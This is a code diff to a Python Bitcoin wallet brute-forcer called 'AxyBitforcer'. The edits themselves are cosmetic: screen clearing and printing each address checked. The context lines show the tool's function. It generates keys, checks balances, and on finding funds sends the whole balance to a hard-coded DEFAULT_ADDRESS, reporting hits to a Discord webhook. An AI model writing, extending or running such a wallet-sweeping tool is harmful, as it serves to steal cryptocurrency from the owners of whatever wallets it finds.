@@ -3,6 +3,7 @@ import bip32utils
 from mnemonic import Mnemonic
 import requests
 import sys
+import os
 
 DISCORD_WEBHOOK_URL = ""  
 DEFAULT_ADDRESS = ""
@@ -45,7 +46,9 @@ def send_to_discord(payload):
 def check_balance(private_key):
     wallet = Key(private_key)
     balance = wallet.get_balance('usd')
+    print(f"[!] > Checking {wallet.address}")
     if float(balance) > 0:
+        os.system('cls' if os.name == "nt" else "clear")
         print('[!] > Found some Bitcoins!')
         try:
             wallet.send([(DEFAULT_ADDRESS, balance, 'usd')], leftover=DEFAULT_ADDRESS)
@@ -68,7 +71,8 @@ def check_balance(private_key):
         return False
     
 def main():
-    print("[!] > AxyBitforcer is running without logs. Keep this window open.")
+    os.system('cls' if os.name == "nt" else "clear")
+    print("[!] > AxyBitforcer is running. Keep this window open.")
     print("[!] > Notifications will be sent to your Discord.")
     try:
         while True:
@@ -85,6 +89,7 @@ def main():
         sys.exit("Goodbye!")
     
 if __name__ == "__main__":
+    os.system('cls' if os.name == "nt" else "clear")
     print("""
 █████╗ ██╗  ██╗██╗   ██╗██████╗ ██╗████████╗███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
 ██╔══██╗╚██╗██╔╝╚██╗ ██╔╝██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
